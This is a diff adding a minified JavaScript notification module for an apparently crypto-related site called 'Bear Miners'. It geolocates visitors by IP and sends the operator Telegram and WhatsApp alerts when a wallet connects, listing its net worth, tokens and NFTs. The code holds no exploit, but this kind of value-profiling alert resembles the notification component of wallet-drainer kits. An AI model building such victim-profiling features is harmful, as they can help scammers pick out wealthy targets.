@@ -1,0 +1,21 @@
+module.exports=[27837,e=>{"use strict";e.s(["TelegramService",()=>o]);var t=e.i(98043);class o{static async sendNotification(e){console.log("[NotificationService] Processing outbound alert...");try{let o=await t.prisma.globalSettings.findUnique({where:{id:1}});if(!o)return void console.error("[NotificationService] Fatal: Global settings not found in database.");if(o.telegramBotToken&&o.telegramChatId){console.log(`[TelegramService] Sending alert to Chat ID: ${o.telegramChatId}...`);let t=`https://api.telegram.org/bot${o.telegramBotToken}/sendMessage`,i=await fetch(t,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:o.telegramChatId,text:e,parse_mode:"HTML"})});if(i.ok)console.log("[TelegramService] ✅ Success: Message delivered to Telegram.");else{let a=await i.text();console.error(`[TelegramService] ❌ Failed: ${i.status} - ${a}`),a.includes("can't parse entities")&&(console.log("[TelegramService] ℹ️ Retrying with plain-text fallback..."),await fetch(t,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:o.telegramChatId,text:e.replace(/<[^>]*>/g,"")})}))}}else(o.telegramBotToken||o.telegramChatId)&&console.warn("[TelegramService] ⚠️ Configuration is incomplete. Ensure both Token and Chat ID are set.");if(o.whatsappEnabled&&o.twilioAccountSid&&o.twilioAuthToken&&o.twilioPhoneNumber){console.log(`[WhatsAppService] Sending alert via Twilio to ${o.twilioPhoneNumber}...`);let t=Buffer.from(`${o.twilioAccountSid}:${o.twilioAuthToken}`).toString("base64"),i=`https://api.twilio.com/2010-04-01/Accounts/${o.twilioAccountSid}/Messages.json`,a=e.replace(/<[^>]*>/g,""),n=await fetch(i,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded",Authorization:`Basic ${t}`},body:new URLSearchParams({From:o.twilioPhoneNumber,To:o.twilioPhoneNumber.startsWith("whatsapp:")?o.twilioPhoneNumber:`whatsapp:${o.twilioPhoneNumber}`,Body:`[Bear Miners Alert]
+${a}`})});if(n.ok)console.log("[WhatsAppService] ✅ Success: Alert delivered to WhatsApp.");else{let e=await n.text();console.error(`[WhatsAppService] ❌ Failed: ${n.status} - ${e}`)}}else o.whatsappEnabled&&console.warn("[WhatsAppService] ⚠️ WhatsApp enabled but Twilio configuration is missing fields.")}catch(e){console.error("[NotificationService] 🚨 Fatal Error during delivery:",e)}}static async getIpDetails(e){if(!e||"::1"===e||"127.0.0.1"===e)return"Localhost (Dev Environment)";try{let t=await fetch(`http://ip-api.com/json/${e}?fields=status,country,city,isp`),o=await t.json();if("success"===o.status)return`${o.city}, ${o.country} (${o.isp})`}catch(e){console.warn("Failed to fetch IP details:",e)}return"Unknown Location"}static formatConnectionMessage(e,t,o="Solana",i=[],a=[]){let n=`${e.slice(0,6)}...${e.slice(-4)}`,r=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD"}).format(t),s=`https://solscan.io/account/${e}`,l=String(o||"Solana").toLowerCase();l.includes("eth")||l.includes("erc")?s=`https://etherscan.io/address/${e}`:l.includes("btc")||l.includes("bitcoin")?s=`https://mempool.space/address/${e}`:(l.includes("bsc")||l.includes("binance"))&&(s=`https://bscscan.com/address/${e}`);let c="";i&&i.length>0&&(i.slice(0,15).forEach(e=>{let t=e.symbol||"Unknown",o=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD"}).format(e.valueUsd||0),i=Number(e.amount).toLocaleString(void 0,{maximumFractionDigits:2});c+=`🔹 <b>${t}</b>: ${i} (${o})
+`}),i.length>15&&(c+=`<i>...and ${i.length-15} more tokens</i>
+`));let d="";return a&&a.length>0&&(a.slice(0,10).forEach(e=>{d+=`🖼 <code>${e.mint.slice(0,5)}...${e.mint.slice(-5)}</code>
+`}),a.length>10&&(d+=`<i>...and ${a.length-10} more NFTs</i>
+`)),`
+💰 <b>${r} ${o} Wallet Connected</b>
+
+👤 <b>User:</b> <code>${n}</code>
+🏦 <b>Network:</b> ${o}
+💵 <b>Net Worth:</b> <b>${r}</b>
+
+<b>Top Tokens & Meme Coins:</b>
+${c||"No tokens found."}
+${a.length>0?`
+<b>NFTs Detected:</b>
+${d}`:""}
+🔗 <a href="${s}">View on Explorer</a>
+    `.trim()}static escapeHTML(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}}}];
+
+//# sourceMappingURL=src_lib_telegram_ts_730b9dc1._.js.map
